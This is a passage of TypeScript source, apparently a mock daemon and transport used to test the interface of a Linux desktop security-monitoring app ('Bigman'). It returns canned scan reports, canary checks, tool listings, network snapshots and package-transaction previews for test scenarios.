      case "yara": return r(await this.check(token, 900, () => report({ id: id(), created: now(), kind: "YARA-X scan", subject: request.target, coverage: { checked: ["YARA-X rules"], notes: ["Rule matches are rule results, not proof of malware."], skipped: [] } }), "YARA-X scan", request.target));
      case "canary_test": return r(await this.check(token, 800, () => report({ id: id(), created: now(), kind: "Canary verification", subject: this.canaries.find((c) => c.id === request.id)?.path ?? "", coverage: { checked: ["Monitor heartbeat", "Read receipt"], notes: ["Verifies local detection and durable evidence, not notification delivery or reader identity."], skipped: [] }, findings: [{ rule: "canary.verified", severity: "info", summary: "Local read detection verified", evidence: "Kernel read receipt from the monitor", action: "Leave monitoring running." }] }), "Canary verification", request.id));
      case "scan_items": return { type: "scan_items", value: this.items.get(request.report) ?? [] };
      case "quarantined": return { type: "quarantined", value: this.quarantine };
      case "canaries": return { type: "canaries", value: { canaries: this.canaries, monitor: this.monitor ? { updated: now() - 2, pid: 4121, watched: this.canaries.length, configured: this.canaries.length, errors: [], watched_ids: this.canaries.map((c) => c.id) } : null, default_path: "/home/sam/Documents/backup-access.env" } };
      case "tool_groups": return { type: "tool_groups", value: [
        { id: "clamav", label: "ClamAV", purpose: "Known-malware file scanning and signature updates", installed: this.scenario !== "empty" },
        { id: "shellcheck", label: "ShellCheck", purpose: "Shell correctness checks during installer inspection", installed: this.scenario === "calm" },
        { id: "sandbox", label: "Bubblewrap and strace", purpose: "Offline installer rehearsal and isolated PDF parsing", installed: this.scenario !== "empty" },
        { id: "pdf", label: "Poppler utilities", purpose: "PDF metadata and link extraction", installed: true },
        { id: "container", label: "Podman", purpose: "Disposable containers for untrusted projects", installed: this.scenario !== "empty" },
        { id: "lynis", label: "Lynis", purpose: "System hardening audit", installed: false },
        { id: "firewall", label: "OpenSnitch", purpose: "Application firewall", installed: false },
      ] };
      case "rules": return { type: "rules", value: rules as RuleInfo[] };
      case "open_tool": return { type: "done", value: { message: "Opened.", report: null, undo: null } };
      case "events": return { type: "events", value: this.events.filter((e) => e.at >= request.since && (request.until === null || e.at <= request.until) && (request.sources.length === 0 || request.sources.includes(e.source))).slice(-request.limit).reverse() };
      case "unread": return { type: "unread", value: this.unread() };
      case "preview_transaction": return { type: "error", value: { message: "Previews come from package-manager hooks, not the app" } };
      case "decide":
        this.push({ type: "preview_done", value: { id: request.id, proceed: request.proceed, by: "you" } });
        return { type: "done", value: { message: request.proceed ? "The transaction continues." : "The transaction was stopped.", report: null, undo: null } };
      case "receipt": {
        const found = RECEIPTS[request.id];
        return found ? { type: "receipt", value: found } : { type: "error", value: { message: `No receipt ${request.id}` } };
      }
      case "mark_seen": {
        this.seenThrough = Math.max(0, request.through);
        const unread = this.unread();
        this.push({ type: "unread", value: unread });
        return { type: "unread", value: unread };
      }
      case "samples": return { type: "samples", value: this.scenario === "empty" ? { bucket: 1, samples: [] } : samplesFor(request.since, request.until, request.points) };
      case "network": {
        const snapshot = networkSnapshot(this.scenario);
        return { type: "network", value: this.scenario === "empty" ? { ...snapshot, connections: [], listeners: [] } : snapshot };
      }
      case "sources": return { type: "sources", value: sourceStatuses(this.scenario) };
      case "notifications": return { type: "notifications", value: this.notifications };
      case "preferences": return { type: "preferences", value: this.preferences };
      case "set_preferences": this.preferences = request.preferences; return { type: "preferences", value: this.preferences };
      case "set_notifications": this.notifications = request.settings; return { type: "notifications", value: this.notifications };
      case "subscribe": return { type: "error", value: { message: "Subscribe needs a connection of its own" } };
      case "preview": return { type: "plan", value: this.plan(request.action) };
      case "apply": await sleep(700 * this.speed); return { type: "done", value: this.apply(request.action) };
    }
  }
}

export function mockTransport(scenario = "findings", latencyMs = 250, speed = 1): Transport {
  const daemon = new MockDaemon(scenario, speed);
  return {
    async request(request: Request, token?: string): Promise<Response> {
      if (scenario === "loading") return new Promise(() => undefined);
      if (latencyMs) await sleep(latencyMs);
      if (scenario === "disconnected") {
        throw new DisconnectedError("Bigman daemon is not running at /run/user/1000/bigman/bigmand.sock");
      }
      return daemon.handle(request, token);
    },
    async cancel(token: string) {
      daemon.running.get(token)?.();
      await Promise.resolve();
    },
    subscribe({ events, samples }, onPush) {
      if (scenario === "disconnected") {
        return { ended: Promise.reject(new DisconnectedError("Bigman daemon is not running")), stop: () => undefined };
      }
      let stop: () => void = () => undefined;
      const ended = new Promise<void>((resolve) => {
        const subscriber = (live: Live) => {
          if (live.type === "samples" ? samples : events) onPush(live);
        };
        daemon.subscribers.add(subscriber);
        if (events) onPush({ type: "unread", value: daemon.unread() });
        // `?scenario=preview`: a transaction waits for an answer as soon as the app connects.
        const waiting = RECEIPTS["rc-412"];
        if (events && scenario === "preview" && waiting) {
          onPush({
            type: "preview",
            value: {
              deadline: now() + 60,
              receipt: {
                ...waiting,
                id: "pv-1",
                at: now(),
                transaction: "preview-4411",
                repositories: { nix: "fedora", "nix-libs": "fedora" },
                after: { checked: false, listeners: [] },
                coverage: { checked: ["Package database (rpm archives)"], notes: ["A preview from the downloaded package files, before anything was installed. Nothing was unpacked or run."], skipped: [] },
              },
            },
          });
        }
        // Tests run with speed 0 and push only what their actions cause.
        const timer = speed > 0 && samples
          ? setInterval(() => daemon.push({ type: "samples", value: INTERFACES.map((iface) => sampleAt(iface, now())) }), 1_000)
          : undefined;
        stop = () => {
          clearInterval(timer);
          daemon.subscribers.delete(subscriber);
          resolve();
        };
      });
      return { ended, stop: () => stop() };
    },
  };
}

/** Browser stand-ins for the desktop file chooser and report export. */
export const mockShell: DesktopShell = {
  choosePath: (kind) => Promise.resolve(kind === "directory" ? "/home/sam/Projects/example-app" : "/home/sam/Downloads/install-tool.sh"),
  exportReport: (reportId) => Promise.resolve(`/home/sam/bigman-${reportId}.json`),
};

export function scenarioFromLocation(): string {
  return new URLSearchParams(window.location.search).get("scenario") ?? "findings";
}
